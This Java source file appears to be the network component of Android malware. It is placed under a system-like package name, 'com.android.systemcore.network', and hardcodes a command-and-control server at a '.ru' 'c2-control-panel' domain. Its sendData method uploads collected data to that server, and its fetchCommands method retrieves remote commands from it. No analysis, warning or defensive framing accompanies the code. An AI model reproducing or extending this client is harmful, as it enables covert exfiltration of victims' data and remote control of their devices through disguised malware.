package com.android.systemcore.network;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;
import android.util.Log;
import org.json.JSONObject;

public class ApiClient {
    
    private static final String TAG = "ApiClient";
    private static final String BASE_URL = "https://c2-control-panel.darknet-services.ru/api/v2";
    private static final String ENDPOINT_UPLOAD = "/upload";
    private static final String ENDPOINT_COMMAND = "/command";
    private static final String ENDPOINT_DATA = "/data";
    private static final String ENDPOINT_STATUS = "/status";
    private static final String ENDPOINT_CONFIG = "/config";
    
    private static ApiClient instance;
    private int connectionTimeout = 15000;
    private int readTimeout = 15000;
    
    private ApiClient() {
        // Private constructor for singleton pattern
    }
    
    public static synchronized ApiClient getInstance() {
        if (instance == null) {
            instance = new ApiClient();
        }
        return instance;
    }
    
    public String getBaseUrl() {
        return BASE_URL;
    }
    
    public String buildEndpoint(String path) {
        if (path == null || path.isEmpty()) {
            return BASE_URL;
        }
        if (path.startsWith("/")) {
            return BASE_URL + path;
        }
        return BASE_URL + "/" + path;
    }
    
    public String getUploadEndpoint() {
        return buildEndpoint(ENDPOINT_UPLOAD);
    }
    
    public String getCommandEndpoint() {
        return buildEndpoint(ENDPOINT_COMMAND);
    }
    
    public String getDataEndpoint() {
        return buildEndpoint(ENDPOINT_DATA);
    }
    
    public String getStatusEndpoint() {
        return buildEndpoint(ENDPOINT_STATUS);
    }
    
    public String getConfigEndpoint() {
        return buildEndpoint(ENDPOINT_CONFIG);
    }
    
    public String executeRequest(String endpoint, String method, JSONObject payload) {
        HttpURLConnection connection = null;
        try {
            URL url = new URL(endpoint);
            connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod(method);
            connection.setConnectTimeout(connectionTimeout);
            connection.setReadTimeout(readTimeout);
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setRequestProperty("User-Agent", "AndroidClient/1.0");
            
            if (payload != null && (method.equals("POST") || method.equals("PUT"))) {
                connection.setDoOutput(true);
                DataOutputStream outputStream = new DataOutputStream(connection.getOutputStream());
                outputStream.writeBytes(payload.toString());
                outputStream.flush();
                outputStream.close();
            }
            
            int responseCode = connection.getResponseCode();
            Log.d(TAG, "Response Code: " + responseCode);
            
            BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuilder response = new StringBuilder();
            String line;
            
            while ((line = reader.readLine()) != null) {
                response.append(line);
            }
            reader.close();
            
            return response.toString();
            
        } catch (Exception e) {
            Log.e(TAG, "Error executing request: " + e.getMessage());
            return null;
        } finally {
            if (connection != null) {
                connection.disconnect();
            }
        }
    }
    
    public boolean sendData(JSONObject data) {
        try {
            String response = executeRequest(getDataEndpoint(), "POST", data);
            return response != null && !response.isEmpty();
        } catch (Exception e) {
            Log.e(TAG, "Failed to send data: " + e.getMessage());
            return false;
        }
    }
    
    public JSONObject fetchCommands() {
        try {
            String response = executeRequest(getCommandEndpoint(), "GET", null);
            if (response != null) {
                return new JSONObject(response);
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to fetch commands: " + e.getMessage());
        }
        return null;
    }
    
    public void setConnectionTimeout(int timeout) {
        this.connectionTimeout = timeout;
    }
    
    public void setReadTimeout(int timeout) {
        this.readTimeout = timeout;
    }
}